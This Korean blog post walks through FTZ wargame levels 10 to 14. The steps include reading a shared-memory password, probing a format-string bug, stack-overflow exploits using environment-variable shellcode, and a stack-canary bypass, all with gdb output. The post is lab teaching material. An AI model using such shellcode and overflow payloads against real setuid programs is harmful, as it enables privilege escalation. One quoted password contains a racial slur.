---
layout: article
title: "[System]System hacking(2)"
key: 19700101
tags:
  - System
  - Dev
  - Pwnable
toc: true
mathjax: true
mathjax_autoNumber: true
---

# [+] System Hacking(10~20)

<!--more-->

## [+] FTZ level10

### Analysis

공유 메모리에 관한 문제라고 한다.
공유 메모리 여러 개의 프로세스가 함께 사용하는 메모리를 의미한다. 이 공유 메모리를 이용해 프로세스 간 통신이 가능하다. 참고로 프로세스 간 통신(IPC)를 이용하는 방법으로는 공유 메모리 외에 메시지 큐, 세마포어가 존재한다.

공유 메모리는 최초로 공유 메모리를 생성하는 프로세스에 의해서 생성되며 커널에서 관리하게 된다. 또한 한번 만들어진 메모리 공간은 프로세스가 사용하지 않는다고 사라지지 않고 직접 삭제 또는 리부팅 시에만 사라진다

공유 메모리가 사용되는 것을 확인하는 명령어는 `ipcs` 명령어이다.

```c
#include <stdio.h>
#include <sys/shm.h>
#include <sys/types.h>

#define BUFFSIZE 1024

int main()
{
        void *shM=(void *)0;
        int shMID;
        char buf[BUFFSIZE]="3456";
        key_t keyval =7777;

        shMID=shmget(keyval,BUFFSIZE,IPC_CREAT);
        printf("%d\n",shMID);
        shM=shmat(shMID,(void*)0,0);
        if(shM==(void*)-1)
                printf("Error!!\n");
        else
                memcpy(shM,buf,BUFFSIZE);
                printf("%s\n",shM);
        shmdt(shM); 
         
        return 0;
}
```

`shmget()` 함수를 이용해 공유 메모리를 생성하여 공유된 메모리의 ID 값을 반환하여 `shMID` 변수에 할당한다. `shmat()` 함수를 이용해 `shM` 변수에 메모리를 할당한다. `malloc` 함수와 유사하다.

그리고 `shmdt()`함수를 이용해 공유 메모리와 분리하고 종료한다.


```c
#include <stdio.h>
#include <sys/shm.h>
#include <sys/types.h>

#define shmKey 7530
#define BUFFSIZE 1024

int main()
{
        int shMID;
        char buf[BUFFSIZE];
        void *shM;
        shMID=shmget(shmKey,BUFFSIZE,IPC_CREAT);
        if(shMID==-1){
                printf("Error shmget()\n");
                exit(0);
        }
        shM=shmat(shMID,(void *)0,0);
        if((void *)-1==shM){
                printf("Error shmat()\n");
                exit(0);
        }
    	memcpy(buf,shM,BUFFSIZE);
    	printf("%s\n",buf);
        //printf("%s\n",(char *)shM);
        shmdt(shM);
        return 0;
}
```

위와 같이 짜서 실행하면 패스워드가 출력된다.

공유 메모리 원리에 대해 좀더 알아보자

```c
#include <stdio.h>
#include <sys/shm.h>
#include <sys/types.h>

#define BUFFSIZE 1024
#define shmkey 7777

int main()
{
        void *shM;
        int shMID;
        char buf[BUFFSIZE]="3456";

        shMID=shmget(shmkey,BUFFSIZE,IPC_CREAT|0666);
        shM=shmat(shMID,(void *)0,0);

        memcpy(shM,buf,BUFFSIZE);
        printf("%s\n",shM);

        shmdt(shM);
        return 0;
}
```

위는 공유 메모리를 생성하는 코드이다. 이제 저 프로그램을 공격하는 코드를 짜본다.

```c
#include <stdio.h>
#include <sys/shm.h>
#include <sys/types.h>

#define BUFFSIZE 1024
#define shmKey 7777

int main()
{
        void *shM;
        int shMID;
        char buf[BUFFSIZE];

        shMID=shmget(shmKey,BUFFSIZE,0666);
        if(shMID==-1){
                printf("Error shmget()!\n");
                exit(0);
        }
        shM=shmat(shMID,(void *)0,0);
        if(shM==(void *)-1){
                printf("Error shmat()!\n");
                exit();
        }
        memcpy(buf,shM,BUFFSIZE);
        if(strcmp(buf,"3456")==0)
                printf("key is %s\n",buf);
        else
                printf("invalid password\n");
        shmdt(shM);
        return 0;
}
```

```
[level10@ftz tmp]$ ./shm2
key is 3456
```

컴파일하여 실행하면 위와 같이 공유 메모리에 존재하는 문자열을 가져오는 것을 확인할 수 있다.



## [+] FTZ level11

### Analysis

먼저 간단한 포맷 스트링을 알아보자아

| 식별자 |  인수  |         출력         |
| :----: | :----: | :------------------: |
|   %x   |  int   |   부호 없는 16진수   |
|   %d   |  int   |   부호 있는 10진수   |
|   %o   |  int   |   부호 없는 8진수    |
|   %c   |  char  |         문자         |
|   %s   | char * |        문자열        |
|   %f   | double |         소수         |
|   %p   | void * | 변수의 주소1(16진수) |

포맷스트링에서 어떠한 취약점이 발생하는지 알아보기 위해 아래와 같은 소스를 이용한다.

```c
#include <stdio.h>

int main(int argc, char *argv[])
{
        int value=10;
        char *hacker="hacker";
        char *super="Super";

        printf(argv[1]);
        printf("\n");
}
```

컴파일 시 `gcc -mpreferred-stack-boundary=2 <c source file>` 으로 옵션을 추가해 더미를 제거한다.

```assembly
(gdb) disass main
Dump of assembler code for function main:
0x08048328 <main+0>:	push   %ebp
0x08048329 <main+1>:	mov    %esp,%ebp
0x0804832b <main+3>:	sub    $0xc,%esp
0x0804832e <main+6>:	movl   $0xa,0xfffffffc(%ebp)
0x08048335 <main+13>:	movl   $0x8048410,0xfffffff8(%ebp)
0x0804833c <main+20>:	movl   $0x8048417,0xfffffff4(%ebp)
0x08048343 <main+27>:	mov    0xc(%ebp),%eax
0x08048346 <main+30>:	add    $0x4,%eax
0x08048349 <main+33>:	pushl  (%eax)
0x0804834b <main+35>:	call   0x8048268 <printf>
0x08048350 <main+40>:	add    $0x4,%esp
0x08048353 <main+43>:	push   $0x804841d
0x08048358 <main+48>:	call   0x8048268 <printf>
0x0804835d <main+53>:	add    $0x4,%esp
0x08048360 <main+56>:	leave  
0x08048361 <main+57>:	ret    
0x08048362 <main+58>:	nop    
0x08048363 <main+59>:	nop    
End of assembler dump.
```

해당 디스어셈블 코드이다. 자 포맷스트링을 통해 일어나는 취약점을 확인해본다.

`printf(argv[1])` 으로 실행 시 전달받은 인자를 출력하게 되는데 포맷스트링을 사용하지 않고 이런식의 코딩은 매우 위험하다.

```bash
Starting program: /home/level11/tmp/a.out "%8x %8x %8x %8x %8x %8x %8x %8x"

Breakpoint 1, 0x0804834b in main ()
(gdb) x/9x $esp
0xbffff6a8:	0xbffffc19	0x08048417	0x08048410	0x0000000a
0xbffff6b8:	0xbffff6d8	0x42015574	0x00000002	0xbffff704
0xbffff6c8:	0xbffff710
(gdb) x/s 0xbffffc19
0xbffffc19:	 "%8x %8x %8x %8x %8x %8x %8x %8x"
(gdb) x/s 0x8048417
0x8048417 <_IO_stdin_used+11>:	 "Super"
(gdb) x/s 0x8048410
0x8048410 <_IO_stdin_used+4>:	 "hacker"
(gdb) x/d 0xbffff6b4
0xbffff6b4:	10
(gdb) x/x 0xbffff6d8 
0xbffff6d8:	0x00000000
(gdb) x/x 0x42015574
0x42015574 <__libc_start_main+228>:	0x58ebc189
(gdb) x/d 0xbffff6c0
0xbffff6c0:	2
(gdb) x/x 0xbffff704 
0xbffff704:	0xbffffc01
(gdb) x/2s 0xbffffc01
0xbffffc01:	 "/home/level11/tmp/a.out"
0xbffffc19:	 "%8x %8x %8x %8x %8x %8x %8x %8x"
(gdb) x/x 0xbffff710
0xbffff710:	0xbffffc39
(gdb) x/16s 0xbffffc39
0xbffffc39:	 "HOSTNAME=ftz.hackerschool.org"
0xbffffc57:	 "SHELL=/bin/bash"
0xbffffc67:	 "TERM=xterm"
0xbffffc72:	 "HISTSIZE=1000"
0xbffffc80:	 "SSH_CLIENT=192.168.64.1 2346 22"
0xbffffca0:	 "SSH_TTY=/dev/pts/0"
0xbffffcb3:	 "USER=level11"
0xbffffcc0:	 "LS_COLORS=no=00:fi=00:di=00;34:ln=00;36:pi=40;33:so=00;35:bd=40;33;01:cd=40;33;01:or=01;05;37;41:mi=01;05;37;41:ex=00;32:*.cmd=00;32:*.exe=00;32:*.com=00;32:*.btm=00;32:*.bat=00;32:*.sh=00;32:*.csh=00"...
0xbffffd88:	 ";32:*.tar=00;31:*.tgz=00;31:*.arj=00;31:*.taz=00;31:*.lzh=00;31:*.zip=00;31:*.z=00;31:*.Z=00;31:*.gz=00;31:*.bz2=00;31:*.bz=00;31:*.tz=00;31:*.rpm=00;31:*.cpio=00;31:*.jpg=00;35:*.gif=00;35:*.bmp=00;3"...
0xbffffe50:	 "5:*.xbm=00;35:*.xpm=00;35:*.png=00;35:*.tif=00;35:"
0xbffffe83:	 "PATH=/usr/local/bin:/bin:/usr/bin:/usr/X11R6/bin:/home/level11/bin"
0xbffffec6:	 "MAIL=/var/spool/mail/level11"
0xbffffee3:	 "PWD=/home/level11/tmp"
0xbffffef9:	 "INPUTRC=/etc/inputrc"
0xbfffff0e:	 "LANG=en_US.UTF-8"
0xbfffff1f:	 "PS1=[\\u@\\h \\W]$ "
(gdb) 
```

자세히 잘봐야한다; 

| *super(0xbffff6ac) | *hacker(0xbffff6b0) | int a(0xbffff6b4) | SFP  | RET(0xbffff6bc) | argc | argv | env      |
| :----------------: | ------------------- | ----------------- | ---- | --------------- | ---- | ---- | -------- |
|     0x08048417     | 0x08048410          | 0x0000000a        |      | 0x42015574      | 2    | 명령 | 환경변수 |

이런 식으로 스택이 구성되있다.
`$esp` 내 존재하는 `%8x %8x %8x ...` 의 경우는 `printf` 함수 호출 전 푸시되어 있는 것이다.

그럼 잘 생각해보면 `*super-4` 만큼에 `printf` 인자를 전달하고 해당 주소에서 -4만큼 가면  복귀주소가 존재할 것이다.

요롷게 스택은 확인을하고.. 바로 해당 레벨 풀이를 해본다.



```bash
[level11@ftz level11]$ gdb ./attackme -q
(gdb) disass main
Dump of assembler code for function main:
0x08048470 <main+0>:	push   %ebp
0x08048471 <main+1>:	mov    %esp,%ebp
0x08048473 <main+3>:	sub    $0x108,%esp
0x08048479 <main+9>:	sub    $0x8,%esp
0x0804847c <main+12>:	push   $0xc14
0x08048481 <main+17>:	push   $0xc14
0x08048486 <main+22>:	call   0x804834c <setreuid>
0x0804848b <main+27>:	add    $0x10,%esp
0x0804848e <main+30>:	sub    $0x8,%esp
0x08048491 <main+33>:	mov    0xc(%ebp),%eax
0x08048494 <main+36>:	add    $0x4,%eax
0x08048497 <main+39>:	pushl  (%eax)
0x08048499 <main+41>:	lea    0xfffffef8(%ebp),%eax
0x0804849f <main+47>:	push   %eax
0x080484a0 <main+48>:	call   0x804835c <strcpy>
0x080484a5 <main+53>:	add    $0x10,%esp
0x080484a8 <main+56>:	sub    $0xc,%esp
0x080484ab <main+59>:	lea    0xfffffef8(%ebp),%eax
0x080484b1 <main+65>:	push   %eax
0x080484b2 <main+66>:	call   0x804833c <printf>
0x080484b7 <main+71>:	add    $0x10,%esp
0x080484ba <main+74>:	leave  
0x080484bb <main+75>:	ret    
0x080484bc <main+76>:	nop    
0x080484bd <main+77>:	nop    
0x080484be <main+78>:	nop    
0x080484bf <main+79>:	nop    
End of assembler dump.
(gdb)
```

위에서 예시를 이용해 스택을 확인한 것 처럼 문제 역시 동일하게 한번 확인한다. 





후 19/01/02 다시 시작

포맷스트링이고 나발이고 책에 너무 정신없이 나와있어서 그냥 bof로 풀었다.
setuid가 걸린 상태에서 gdb가 제대로 동작하지 않아 tmp 디렉토리로 옮긴 후 작업을 하였다.
환경변수에 쉘코드를 넣어두고 해당 환경변수의 주소 값을 이용하여 공격에 성공할 수 있다.

본론부터 보면 strcpy 함수에서 버퍼오버플로우 취약점이 발생한다. 이유는 버퍼에 문자열을 옮길 때 길이에 대한 검증을 하지 않기 때문이다.

```assembly
[level11@ftz tmp]$ gdb -q attackme 
(gdb) disass main
Dump of assembler code for function main:
0x08048470 <main+0>:	push   %ebp
0x08048471 <main+1>:	mov    %esp,%ebp
0x08048473 <main+3>:	sub    $0x108,%esp
0x08048479 <main+9>:	sub    $0x8,%esp
0x0804847c <main+12>:	push   $0xc14
0x08048481 <main+17>:	push   $0xc14
0x08048486 <main+22>:	call   0x804834c <setreuid>
0x0804848b <main+27>:	add    $0x10,%esp
0x0804848e <main+30>:	sub    $0x8,%esp
0x08048491 <main+33>:	mov    0xc(%ebp),%eax
0x08048494 <main+36>:	add    $0x4,%eax
0x08048497 <main+39>:	pushl  (%eax)
0x08048499 <main+41>:	lea    0xfffffef8(%ebp),%eax
0x0804849f <main+47>:	push   %eax
0x080484a0 <main+48>:	call   0x804835c <strcpy>	; 취약함수
0x080484a5 <main+53>:	add    $0x10,%esp
0x080484a8 <main+56>:	sub    $0xc,%esp
0x080484ab <main+59>:	lea    0xfffffef8(%ebp),%eax
0x080484b1 <main+65>:	push   %eax
0x080484b2 <main+66>:	call   0x804833c <printf>
0x080484b7 <main+71>:	add    $0x10,%esp
0x080484ba <main+74>:	leave  
0x080484bb <main+75>:	ret    
0x080484bc <main+76>:	nop    
0x080484bd <main+77>:	nop    
0x080484be <main+78>:	nop    
0x080484bf <main+79>:	nop    
End of assembler dump.
```

때문에 취약한 함수가 실행되고 난 후, `0x80484a5`에 bp를 걸고 진행하면 되겠다.
스택 계산을 하면, `main`함수에서 초기 스택 할당 시, `0x108(264)`만큼 할당하는 것을 확인할 수 있다.(`main+3`)

기존 알고있는 스택 구조 상, `| 264 byte(char[256]) | 4 byte(SFP) | 4 byte(RET) |` 임을 알 수 있다.
그럼 우린 여기서 RET의 주소를 환경변수 내 쉘 코드가 존재하는 주소의 값으로 변조하면 된다.

다음과 같이 gdb에서 버퍼오버플로우를 이용하여 스택을 살펴본다.

```assembly
(gdb) b *main+53
Breakpoint 1 at 0x80484a5
(gdb) r `python -c 'print "A"*256'`
Starting program: /home/level11/tmp/attackme `python -c 'print "A"*256'`

Breakpoint 1, 0x080484a5 in main ()
(gdb) x/128x $esp
0xbfffe590:	0xbfffe5a0	0xbffffb01	0xbfffe5c0	0x00000001
0xbfffe5a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe5b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe5c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe5d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe5e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe5f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe600:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe610:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe620:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe630:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe640:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe650:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe660:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe670:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe680:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe690:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe6a0:	0x4200af00	0x42130a14	0xbfffe6c8	0x42015574	; dummy 8byte, sfp, ret
0xbfffe6b0:	0x00000002	0xbfffe6f4	0xbfffe700	0x4001582c	; argc, argv, env ...


(gdb) x/x 0xbfffe6f4	;argv
0xbfffe6f4:	0xbffffae6
(gdb) x/2s 0xbffffae6
0xbffffae6:	 "/home/level11/tmp/attackme"
0xbffffb01:	 'A' <repeats 200 times>...

(gdb) x/x 0xbfffe700	; env
0xbfffe700:	0xbffffc02
(gdb) x/24s 0xbffffc02
0xbffffc02:	 "HOSTNAME=ftz.hackerschool.org"
0xbffffc20:	 "SHELLCODE=101̜200\211211󿿱0F̜2001󿿐h//shh/bin\211⏓\211󿲒°\v̜200"	;환경변수 내 쉘코드
0xbffffc54:	 "SHELL=/bin/bash"
0xbffffc64:	 "TERM=xterm"
0xbffffc6f:	 "HISTSIZE=1000"
0xbffffc7d:	 "SSH_CLIENT=192.168.64.1 1895 22"
0xbffffc9d:	 "SSH_TTY=/dev/pts/2"
0xbffffcb0:	 "USER=level11"
0xbffffcbd:	 "LS_COLORS=no=00:fi=00:di=00;34:ln=00;36:pi=40;33:so=00;35:bd=40;33;01:cd=40;33;01:or=01;05;37;41:mi=01;05;37;41:ex=00;32:*.cmd=00;32:*.exe=00;32:*.com=00;32:*.btm=00;32:*.bat=00;32:*.sh=00;32:*.csh=00"...
0xbffffd85:	 ";32:*.tar=00;31:*.tgz=00;31:*.arj=00;31:*.taz=00;31:*.lzh=00;31:*.zip=00;31:*.z=00;31:*.Z=00;31:*.gz=00;31:*.bz2=00;31:*.bz=00;31:*.tz=00;31:*.rpm=00;31:*.cpio=00;31:*.jpg=00;35:*.gif=00;35:*.bmp=00;3"...
0xbffffe4d:	 "5:*.xbm=00;35:*.xpm=00;35:*.png=00;35:*.tif=00;35:"
0xbffffe80:	 "PATH=/usr/local/bin:/bin:/usr/bin:/usr/X11R6/bin:/home/level11/bin"
0xbffffec3:	 "MAIL=/var/spool/mail/level11"
0xbffffee0:	 "PWD=/home/level11/tmp"
0xbffffef6:	 "INPUTRC=/etc/inputrc"
0xbfffff0b:	 "LANG=en_US.UTF-8"
0xbfffff1c:	 "PS1=[\\u@\\h \\W]$ "
0xbfffff2d:	 "HOME=/home/level11"
0xbfffff40:	 "SHLVL=1"
0xbfffff48:	 "BASH_ENV=/home/level11/.bashrc"
0xbfffff67:	 "LOGNAME=level11"
0xbfffff77:	 "SSH_CONNECTION=192.168.64.1 1895 192.168.64.131 22"
0xbfffffaa:	 "LESSOPEN=|/usr/bin/lesspipe.sh %s"
0xbfffffcc:	 "G_BROKEN_FILENAMES=1"

```

자 보면 아까 만들어놓은 쉘코드가 환경변수에 잘 들어가있다. 지금 현재는 정상적인 스택의 상태이다.
계산을 해보면 증명이된다. 정상적으로 256바이트의 모든 배열을 사용하였다고 했을 때, 12 byte(dummy + sfp) 뒤에 ret가 있다.  그럼 256+12 = 268 바이트만큼 의미없는 값으로 채워주고 쉘코드가 있는 환경변수의 주소 값을 넣어주면 된다.

```sh
[level11@ftz tmp]$ ./env
Shell ADDR: 0xbffffc22 # 쉘 코드 주소

[level11@ftz level11]$ ./attackme `python -c 'print "A"*268+"\x22\xfc\xff\xbf"'` #RET 주소 변조
sh-2.05b$ id
uid=3092(level12) gid=3091(level11) groups=3091(level11)
sh-2.05b$ my-pass
TERM environment variable not set.

Level12 Password is "it is like this".
```

끝!



## [+] FTZ level12 ~ level13

### Analysis

level 12의 경우 11과 같은 방식의 버퍼오버플로우를 이용하여 풀 수 있다.
level 13의 경우 소스 코드를 보면 다음과 같다.

```c
#include <stdlib.h> 

main(int argc, char *argv[])
{
   long i=0x1234567;
   char buf[1024];

   setreuid( 3094, 3094 );
   if(argc > 1)
   strcpy(buf,argv[1]);

   if(i != 0x1234567) {
   printf(" Warnning: Buffer Overflow !!! \n");
   kill(0,11);
   }
}
```

`buf` 에 1024 바이트만큼 할당을하고, i에는 `0x1234567` 값을 저장하는 것을 볼 수 있다. 마찬가지로 strcpy 함수를 통해 `argv` 값을 `buf`에 복사한다.

무엇인가 하니 스택가드의 기초적인 문제이다. `gdb`를 통해 스택을 살펴보자.

```sh
[level13@ftz level13]$ gdb -q attackme 
(gdb) disass main
Dump of assembler code for function main:
0x080484a0 <main+0>:	push   %ebp
0x080484a1 <main+1>:	mov    %esp,%ebp
0x080484a3 <main+3>:	sub    $0x418,%esp	; 1048 byte
0x080484a9 <main+9>:	movl   $0x1234567,0xfffffff4(%ebp)
0x080484b0 <main+16>:	sub    $0x8,%esp
0x080484b3 <main+19>:	push   $0xc16
0x080484b8 <main+24>:	push   $0xc16
0x080484bd <main+29>:	call   0x8048370 <setreuid>
0x080484c2 <main+34>:	add    $0x10,%esp
0x080484c5 <main+37>:	cmpl   $0x1,0x8(%ebp)
0x080484c9 <main+41>:	jle    0x80484e5 <main+69>
0x080484cb <main+43>:	sub    $0x8,%esp
0x080484ce <main+46>:	mov    0xc(%ebp),%eax
0x080484d1 <main+49>:	add    $0x4,%eax
0x080484d4 <main+52>:	pushl  (%eax)
0x080484d6 <main+54>:	lea    0xfffffbe8(%ebp),%eax
0x080484dc <main+60>:	push   %eax
0x080484dd <main+61>:	call   0x8048390 <strcpy>
0x080484e2 <main+66>:	add    $0x10,%esp
0x080484e5 <main+69>:	cmpl   $0x1234567,0xfffffff4(%ebp)	; breakpoint
0x080484ec <main+76>:	je     0x804850d <main+109>
0x080484ee <main+78>:	sub    $0xc,%esp
0x080484f1 <main+81>:	push   $0x80485a0
0x080484f6 <main+86>:	call   0x8048360 <printf>
0x080484fb <main+91>:	add    $0x10,%esp
0x080484fe <main+94>:	sub    $0x8,%esp
0x08048501 <main+97>:	push   $0xb
0x08048503 <main+99>:	push   $0x0
0x08048505 <main+101>:	call   0x8048380 <kill>
0x0804850a <main+106>:	add    $0x10,%esp
0x0804850d <main+109>:	leave  
0x0804850e <main+110>:	ret    
0x0804850f <main+111>:	nop    
End of assembler dump.
```

함수의 프롤로그 부분을 보면 1048 바이트만큼 할당하는 것을 볼 수 있다.
`| 1024 byte(char buf[1024]) | 4 byte (long i=0x01234567) | 20 byte(DUMMY) | SFP | RET |`

위와 같이 스택이 구성되어있을거라 예상된다.  책에서는 다음과 같이 스택의 구성을 설명했다.

`| 1024 byte(char buf[1024]) | 12 byte(DUMMY) | 4 byte (long i=0x01234567) | 8 byte(DUMMY) | SFP | RET |`

실제 값을 채워넣어보면 책이 맞다는걸 알 수 있다. 내가 예상한 스택의 구성대로 생각하여 버퍼오버플로우를 유도할 경우 1024 바이트에서 세그멘테이션 에러가 나야한다. 하지만 나지 않는다. 실제 1036 바이트만큼 채울 경우 오류가 발생한다. 현재는 64bit가 보편화되어 자료형 `long`의 경우 8byte로 아는 경우가 많지만 32bit 프로그램의 경우 4byte만큼 할당한다.

```sh
[level13@ftz level13]$ ./attackme `python -c 'print "A"*1024'`
[level13@ftz level13]$ ./attackme `python -c 'print "A"*1036'`
 Warnning: Buffer Overflow !!! 
Segmentation fault
```

위와 같이 버퍼를 덮어씌우려 하면 버퍼오버플로우라는 오류 메시지가 출력되며 종료되는 것을 확인할 수 있다. 이렇게 정적으로 스택가드가 존재하는 경우에는 다음과 같이 우회가 가능하다.

먼저 환경변수에 쉘코드를 저장한다.

```sh
[level13@ftz level13]$ export SHELLCODE=`python -c 'print "\x90"*15+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`

[level13@ftz level13]$ echo 'int main() {printf("addr->%p\n",getenv("SHELLCODE"));}' > env.c
[level13@ftz tmp]$ ./a.out 
addr->0xbffffc1d # 쉘코드의 주소
```

다음은 다음과 같은 코드를 이용해 실행하면 쉘을 획득할 수 있다.

```sh
[level13@ftz level13]$ ./attackme `python -c 'print "A"*1036+"\x67\x45\x23\x01"+"A"*12+"\x1d\xfc\xff\xbf"'`
sh-2.05b$ id
uid=3094(level14) gid=3093(level13) groups=3093(level13)
sh-2.05b$ my-pass
TERM environment variable not set.

Level14 Password is "what that nigga want?".
```

`A` 문자를 1036바이트만큼 채운 뒤, 스택가드 값인 `0x01234567`을 채워주고 다음 `RET` 전까지 `A`로 덮어씌우고 쉘 코드가 있는 환경변수의 주소 값 `0xbffffc1d`를 `RET` 에 덮어씌워준다.

그러면 위와 같이 다음 레벨의 쉘을 획득 가능한 것을 확인할 수 있다.

끝!

## [+] FTZ level14

### Analysis

먼저 더미코드의 크기를 찾는 방법에 대해 책에 나와있어서 써본다.

```c
#include <stdio.h>
#include <unistd.h>

int main()
{
	int crap;
	int check;
	char buf[20];
	fgets(buf,45,stdin);

	if(check==0xdeadbeef)
	{
		setreuid(3095,3095);
		system("/bin/sh");
	}
	printf("Input : %s\n &buf : %p\n &check : %p\n &crap : %p\n",buf,buf,&check,&crap);
}
```

실제 문제와 같은 코드에 아래와 같이 `printf`함수를 이용해 해당 변수의 시작 주소 값을 출력한다.

```sh
[level14@ftz tmp]$ ./dummy 
a
Input : a

 &buf : 0xbfffe220
 &check : 0xbfffe248
 &crap : 0xbfffe24c
[level14@ftz tmp]$
```

`buf` 변수는 총 20 byte를 할당하였으나 해당 변수 다음인 `check` 변수의 크기 차이를 확인하면 `0x28` 만큼 차이나는 것을 확인할 수 있다. `check`와 `crap`은 4 byte 차이로 더미가 존재하지 않는다. 

```assembly
[level14@ftz tmp]$ gdb -q attackme 
(gdb) disass main
Dump of assembler code for function main:
0x08048490 <main+0>:	push   %ebp
0x08048491 <main+1>:	mov    %esp,%ebp
0x08048493 <main+3>:	sub    $0x38,%esp	; 56 바이트
```

실제 디버깅을 하면 위와 같이 56 byte 만큼 할당 된 것을 볼 수 있다.

`| 20 byte(buf) | 20 byte(DUMMY) | 4 byte(check) | 4 byte(crap) | 8 byte(DUMMY) |` 으로 확인 된다.

